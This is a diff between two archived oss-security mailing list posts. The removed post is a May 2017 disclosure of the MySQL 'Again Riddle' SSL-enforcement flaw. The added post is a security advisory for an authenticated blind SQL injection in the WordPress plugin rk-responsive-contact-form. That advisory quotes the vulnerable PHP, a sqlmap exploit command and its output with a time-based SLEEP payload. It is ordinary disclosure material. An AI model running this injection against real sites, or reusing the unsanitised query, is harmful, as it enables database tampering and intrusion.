@@ -1,66 +1,56 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/03/10
-Message-Id: <201705031823.09198@pali>
-Date: Wed, 3 May 2017 18:23:09 +0200
-From: Pali Rohár <pali.rohar@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: MySQL - Again Riddle vulnerability (public disclosure)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/23/3
+Message-id: <CEF95F5A-B021-4514-867B-64B38D7CFBF3@me.com>
+Date: Wed, 23 Aug 2017 08:22:07 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Authenticated Blind SQL Injection vulnerability in Wordpress plugin rk-responsive-contact-form v1.0
 Content-Type: text/plain; charset=utf-8
 
-Hi!
+Title: Authenticated Blind SQL Injection vulnerability in Wordpress plugin rk-responsive-contact-form v1.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-07-01
+CVE-ID:[CVE-2017-1002027]
+Download Site: https://wordpress.org/plugins/rk-responsive-contact-form/
+Vendor: rkdevelopers
+Vendor Notified: 2017-08-05
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=198
+Description: A simple WordPress plugin that generates a responsive contact form on your website or blog
+Vulnerability:
+The variable $delid isn't sanitized before being passed into an SQL query in file ./rk-responsive-contact-form/include/rk_user_list.php :
 
-The Riddle vulnerability (CVE-2017-3305) we have it there again. 
+1-<?php 
+2-	global $wpdb;
+3-	$table_name = $wpdb->prefix . "rk_contact";
+4:	$info=$_GET["info"];
+5-	if($info=="del")
+6-	{
+7:	$delid=$_GET["did"];
+8-	
+9-	$wpdb->query("delete from ".$table_name." where `user_id`=".$delid);
+10-	echo "<div style='clear:both;'></div><div class='updated' id='message'><p><strong>:".__('User Record Deleted.','rkcontactform')."</strong>.</p></div>";
+11-	}
+12-?>
 
-So what happened?
+The attacker must have permission to modify contacts in order to exploit this vulnerability.
 
-In 2015 was discovered BACKRONYM vulnerability (CVE-2015-3152) which 
-allowed an attacker to downgrade and snoop on the SSL encrypted 
-connection between MySQL client and server. Oracle claimed it was fixed 
-in MySQL 5.5.49. Later in February 2017 I discovered The Riddle 
-vulnerability (CVE-2017-3305) which allowed an attacker to do man in the 
-middle attack. Oracle claimed it was fixed in MySQL 5.5.55.
-
-And now in April 2017 I found out that it is still not fixed in MySQL 
-5.5.55 properly and I named this defect Again Riddle. Basically fix for 
-The Riddle in 5.5.55 introduced Again Riddle.
-
-And what is the problem?
-
-If MySQL client library libmysqlclient.so is compiled from source code 
-without SSL support via cmake switch -DWITH_SSL=OFF, then all SSL 
-related functions from libmysqlclient.so return success (non-error) 
-value. And function mysql_real_connect() from libmysqlclient.so connects 
-to MySQL server via plain text protocol, even if client enforced SSL 
-mode with certificate verification. Which means that function for 
-enforcing SSL mode does nothing if libmysqlclient.so is compiled without 
-SSL support. So attacker can do exactly same what for The Riddle 
-vulnerability.
-
-So every application which links to libmysqlclient.so and require SSL 
-encryption of MySQL protocol is affected.
-
-I contacted Oracle, MariaDB and Percona security teams about this 
-problem and after discussion we scheduled public disclosure to May 3.
-
-Oracle decided that this Again Riddle vulnerability would not have CVE 
-identifier and would be part of original The Riddle vulnerability 
-CVE-2017-3305.
-
-I'm not sure if this is correct decision, as MariaDB 5.5 was not 
-affected by The Riddle vulnerability, but is affected by Again Riddle.
-
-I was told that prebuild binaries are not affected as they are compiled 
-with SSL support, but lot of distributions compile libraries from source 
-code by their own which means they could be affected.
-
-I prepared POC program written in C to verify if system installed 
-libmysqlclient.so library is vulnerable or not. You can find it on the 
-new Again Riddle website together with some Q&A:
-
-http://again.riddle.link/
-
--- 
-Pali Rohár
-pali.rohar@...il.com
-
-Download attachment "signature.asc " of type "application/pgp-signature" (199 bytes)
+Exploit Code:
+	• $ sqlmap -u 'http://example.com/wp-admin/admin.php?page=rk_user_lists&info=del&did=*' --load-cookies=./cookie.txt --level=2 --risk=1 --dbms=mysql 
+	•  
+	•  
+	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 318 HTTP(s) requests:
+	• ---
+	• Parameter: #1* (URI)
+	•   Type: AND/OR time-based blind
+	•   Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•   Payload: http://example.com:80/wp-admin/admin.php?page=rk_user_lists&info=del&did=(CASE WHEN (6363=6363) THEN SLEEP(5) ELSE 6363 END)
+	• ---
+	• [10:57:22] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [10:57:22] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 10:57:22
